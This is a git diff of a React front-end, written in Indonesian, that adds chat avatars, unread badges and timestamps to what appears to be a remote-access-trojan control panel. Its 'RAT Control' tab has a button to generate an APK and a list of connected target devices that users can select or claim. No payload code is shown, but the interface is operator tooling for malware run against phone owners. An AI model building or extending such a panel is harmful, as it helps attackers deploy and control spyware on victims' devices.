+                  <div key={i} onClick={() => openPrivateChat(name)} className="flex flex-col items-center gap-1 min-w-[60px] cursor-pointer relative">
                     <div className="w-14 h-14 rounded-full border-2 border-green-500 p-0.5">
-                      <div className="w-full h-full rounded-full bg-zinc-800 overflow-hidden flex items-center justify-center">
-                        <img src={`https://api.dicebear.com/7.x/avataaars/svg?seed=${name}&backgroundColor=1a1a24`} alt={name} className="w-full h-full object-cover" />
-                      </div>
+                      <UserAvatar name={name} avatarMap={serverAvatars} size={13} border="border-zinc-800" />
                     </div>
+                    {unreadPrivMap[name] > 0 && (
+                      <span className="absolute top-0 right-2 bg-red-500 text-white text-[10px] font-bold w-5 h-5 flex items-center justify-center rounded-full border-2 border-[#0f0a15]">
+                        {unreadPrivMap[name] > 9 ? '9+' : unreadPrivMap[name]}
+                      </span>
+                    )}
                     <span className="text-[10px] text-zinc-300 truncate w-14 text-center">{name}</span>
                   </div>
                 ))}
@@ -823,9 +986,14 @@ export default function Home() {
             </div>
 
             <div className="grid grid-cols-3 gap-2">
-              <button onClick={() => { setChatMode("global"); setActiveTab("chat"); }} className="bg-blue-600 hover:bg-blue-500 transition-colors rounded-xl p-3 flex flex-col items-center justify-center gap-1 shadow-lg shadow-blue-900/20">
+              <button onClick={openGlobalChat} className="bg-blue-600 hover:bg-blue-500 transition-colors rounded-xl p-3 flex flex-col items-center justify-center gap-1 shadow-lg shadow-blue-900/20 relative">
                 <MessageSquare size={20} className="text-white" />
                 <span className="text-white text-xs font-bold">Public Chat</span>
+                {unreadGlobal > 0 && (
+                  <span className="absolute -top-1 -right-1 bg-red-500 text-white text-[10px] font-bold w-5 h-5 flex items-center justify-center rounded-full border-2 border-[#0f0a15]">
+                    {unreadGlobal > 9 ? '9+' : unreadGlobal}
+                  </span>
+                )}
               </button>
               <a href="https://wa.me/6283832110509" target="_blank" rel="noopener noreferrer" className="bg-emerald-600 hover:bg-emerald-500 transition-colors rounded-xl p-3 flex flex-col items-center justify-center gap-1 shadow-lg shadow-emerald-900/20">
                 <Phone size={20} className="text-white" />
@@ -856,12 +1024,12 @@ export default function Home() {
             </div>
 
             <div className="w-full h-48 bg-black rounded-2xl overflow-hidden relative shadow-lg border border-zinc-800">
-              <video 
-                key={videoIndex} 
-                autoPlay 
-                muted 
-                playsInline 
-                className="w-full h-full object-cover" 
+              <video
+                key={videoIndex}
+                autoPlay
+                muted
+                playsInline
+                className="w-full h-full object-cover"
                 onEnded={() => setVideoIndex(1)}
                 loop={videoIndex === 1}
               >
@@ -892,7 +1060,7 @@ export default function Home() {
 
             <div>
               <h3 className="text-sm font-bold text-white mb-3 flex items-center gap-2"><Wrench size={16} className="text-zinc-400"/> Semua Fitur</h3>
-              
+
               <div className="bg-[#1c1c1e] border border-zinc-700 rounded-xl p-3 mb-3 flex items-center justify-between">
                 <div className="flex items-center gap-2">
                   <Shield size={18} className={senderActive ? "text-green-500" : "text-red-500"} />
@@ -935,27 +1103,59 @@ export default function Home() {
               <button onClick={() => setActiveTab("home")} className="p-2 mr-2 text-white">
                 <ChevronLeft size={24} />
               </button>
-              <div className="flex flex-col">
+              <div className="flex flex-col flex-1">
                 <span className="text-white font-bold">{chatMode === "global" ? "Public Chat" : chatTarget}</span>
                 <span className="text-[10px] text-zinc-400">{chatMode === "global" ? "Semua User" : "Private Message"}</span>
               </div>
             </div>
 
-            <div className="flex-1 overflow-y-auto px-4 py-2 space-y-4">
-              {(chatMode === "global" ? globalMsgs : privateMsgs).map((m, i) => (
-                <div key={i} className={`flex ${m.from === username ? 'flex-row-reverse' : 'flex-row'} items-start gap-2`}>
-                  <div className="w-8 h-8 rounded-full bg-zinc-700 flex items-center justify-center text-xs text-white uppercase flex-shrink-0">{m.from.charAt(0)}</div>
-                  <div className={`flex flex-col ${m.from === username ? 'items-end' : 'items-start'}`}>
-                    <span className="text-[10px] text-zinc-400 mb-1">{m.from}</span>
-                    <div className={`p-3 rounded-2xl max-w-[80%] text-sm ${m.from === username ? 'bg-zinc-600 text-white rounded-tr-sm' : 'bg-[#1c1c1e] text-zinc-200 rounded-tl-sm border border-zinc-700'}`}>{m.msg}</div>
+            <div ref={chatScrollRef} className="flex-1 overflow-y-auto px-4 py-4 space-y-3 bg-[#0a0610]">
+              {(chatMode === "global" ? globalMsgs : privateMsgs).map((m, i) => {
+                const isMe = m.from === username;
+                const showDate = i === 0 || dateFmt(m.ts) !== dateFmt((chatMode === "global" ? globalMsgs : privateMsgs)[i - 1].ts);
+
+                return (
+                  <div key={i}>
+                    {showDate && (
+                      <div className="flex justify-center my-3">
+                        <span className="text-[10px] text-zinc-500 bg-[#1c1c1e] px-3 py-1 rounded-full border border-zinc-700">
+                          {dateFmt(m.ts)}
+                        </span>
+                      </div>
+                    )}
+                    <div className={`flex ${isMe ? 'justify-end' : 'justify-start'} gap-2 mb-1`}>
+                      {!isMe && (
+                        <div className="self-end mb-1">
+                          <UserAvatar name={m.from} avatarMap={serverAvatars} size={8} border="border-zinc-700" />
+                        </div>
+                      )}
+                      <div className={`flex flex-col max-w-[78%] ${isMe ? 'items-end' : 'items-start'}`}>
+                        {!isMe && chatMode === "global" && (
+                          <span className="text-[10px] text-zinc-500 mb-1 ml-1">{m.from}</span>
+                        )}
+                        <div className={`px-3 py-2 rounded-2xl text-sm break-words ${isMe ? 'bg-emerald-700/80 text-white rounded-tr-sm' : 'bg-[#1c1c1e] text-zinc-100 rounded-tl-sm border border-zinc-700'}`}>
+                          {m.msg}
+                          <div className={`text-[9px] mt-1 ${isMe ? 'text-emerald-200/70 text-right' : 'text-zinc-500'}`}>
+                            {timeFmt(m.ts)}
+                          </div>
+                        </div>
+                      </div>
+                    </div>
                   </div>
+                );
+              })}
+              {(chatMode === "global" ? globalMsgs : privateMsgs).length === 0 && (
+                <div className="flex flex-col items-center justify-center h-full text-center py-20">
+                  <MessageSquare size={48} className="text-zinc-700 mb-3" />
+                  <p className="text-zinc-500 text-sm">Belum ada pesan</p>
+                  <p className="text-zinc-600 text-xs mt-1">Mulai percakapan pertama</p>
                 </div>
-              ))}
+              )}
             </div>
-            
+
             <form onSubmit={chatMode === "global" ? sendGlobalMsg : sendPrivateMsg} className="p-3 bg-[#1c1c1e] border-t border-zinc-700 flex gap-2 items-center shrink-0">
-              <input type="text" value={msgInput} onChange={e=>setMsgInput(e.target.value)} placeholder="Ketik pesan..." className="flex-1 bg-[#0f0a15] border border-zinc-700 rounded-full px-4 py-2 text-sm text-white focus:outline-none" />
-              <button type="submit" className="bg-zinc-600 p-2 rounded-full text-white"><Send size={16} /></button>
+              <input type="text" value={msgInput} onChange={e=>setMsgInput(e.target.value)} placeholder="Ketik pesan..." className="flex-1 bg-[#0f0a15] border border-zinc-700 rounded-full px-4 py-2 text-sm text-white focus:outline-none focus:border-zinc-500" />
+              <button type="submit" className="bg-emerald-600 hover:bg-emerald-500 p-2 rounded-full text-white transition-colors"><Send size={16} /></button>
             </form>
           </div>
         )}
@@ -984,15 +1184,15 @@ export default function Home() {
         {activeTab === "rat" && (
           <div className="space-y-4">
             <h2 className="text-white font-bold text-xl mb-4">RAT Control</h2>
-            
+
             <div className="w-full h-48 bg-black rounded-2xl overflow-hidden relative shadow-lg border border-zinc-800 mb-4">
               <video autoPlay muted loop playsInline className="w-full h-full object-cover">
                 <source src={RAT_VIDEO} type="video/mp4" />
               </video>
             </div>
 
-            <button 
-              onClick={handleGenerateAPK} 
+            <button
+              onClick={handleGenerateAPK}
               disabled={isGenerating}
               className="w-full bg-green-600 hover:bg-green-500 text-white font-bold py-3 rounded-xl flex justify-center items-center gap-2 mb-4 transition-colors"
             >
@@ -1002,7 +1202,7 @@ export default function Home() {
 
             <div className="bg-[#1c1c1e] border border-zinc-700 p-4 rounded-xl mb-4">
               <h3 className="text-white font-bold text-sm mb-3 flex items-center gap-2">
-                <Smartphone size={16} className="text-green-500" /> 
+                <Smartphone size={16} className="text-green-500" />
                 Target Terhubung ({onlineDevices.length})
               </h3>
               {onlineDevices.length === 0 ? (
@@ -1010,32 +1210,32 @@ export default function Home() {
               ) : (
                 <div className="space-y-2 max-h-40 overflow-y-auto">
                   {onlineDevices.map((device) => (
-                    <div 
-                      key={device.deviceId} 
+                    <div
+                      key={device.deviceId}
                       className={`p-3 rounded-lg border flex justify-between items-center ${
-                        device.ownerId === username 
-                          ? (ratTargetId === device.deviceId ? 'bg-green-900/30 border-green-500' : 'bg-black/40 border-green-500/50 hover:border-green-500') 
+                        device.ownerId === username
+                          ? (ratTargetId === device.deviceId ? 'bg-green-900/30 border-green-500' : 'bg-black/40 border-green-500/50 hover:border-green-500')
                           : 'bg-yellow-900/20 border-yellow-500/50'
                       }`}
                     >
                       <div>
                         <p className="text-xs text-white font-bold">
-                          {device.deviceName} 
+                          {device.deviceName}
                           {device.ownerId === username && " (Milik Anda)"}
                           {!device.ownerId && " (Baru Terhubung)"}
                         </p>
                         <p className="text-[10px] text-zinc-500 font-mono">{device.deviceId}</p>
                       </div>
-                      
+
                       {device.ownerId === username ? (
-                        <button 
+                        <button
                           onClick={() => setRatTargetId(device.deviceId)}
                           className={`px-3 py-1 rounded text-xs font-bold ${ratTargetId === device.deviceId ? 'bg-green-600 text-white' : 'bg-zinc-700 text-white'}`}
                         >
                           {ratTargetId === device.deviceId ? 'Dipilih' : 'Pilih'}
                         </button>
                       ) : (
-                        <button 
+                        <button
                           onClick={() => claimDevice(device.deviceId)}
                           className="px-3 py-1 rounded text-xs font-bold bg-yellow-600 hover:bg-yellow-500 text-white"
                         >
@@ -1103,7 +1303,7 @@ export default function Home() {
                 <LogOut size={20} />
                 <span>Logout Akun</span>
              </button>
-             
+
              <div className="bg-[#1c1c1e] border border-zinc-700 p-4 rounded-xl mt-6">
                 <h3 className="text-white font-bold mb-2">Info Aplikasi</h3>
                 <p className="text-xs text-zinc-400">Versi: 2.0.0 (Mikasa Update)</p>
@@ -1121,9 +1321,14 @@ export default function Home() {
              { id: 'chat', icon: <MessageSquare size={20}/>, label: 'Chat' },
              { id: 'settings', icon: <Settings size={20}/>, label: 'Setting' },
            ].map((item) => (
-             <button key={item.id} onClick={() => setActiveTab(item.id)} className={`flex flex-col items-center p-2 ${activeTab === item.id ? 'text-zinc-300' : 'text-zinc-600'}`}>
+             <button key={item.id} onClick={() => { if(item.id === 'chat') openGlobalChat(); else setActiveTab(item.id); }} className={`flex flex-col items-center p-2 relative ${activeTab === item.id ? 'text-zinc-300' : 'text-zinc-600'}`}>
                <div className={`p-2 rounded-full ${activeTab === item.id ? 'bg-zinc-700 text-white' : ''}`}>{item.icon}</div>
                <span className="text-[10px]">{item.label}</span>
+               {item.id === 'chat' && unreadTotal > 0 && (
+                 <span className="absolute top-0 right-2 bg-red-500 text-white text-[10px] font-bold w-5 h-5 flex items-center justify-center rounded-full border-2 border-[#1c1c1e]">
+                   {unreadTotal > 9 ? '9+' : unreadTotal}
+                 </span>
+               )}
              </button>
            ))}
         </div>
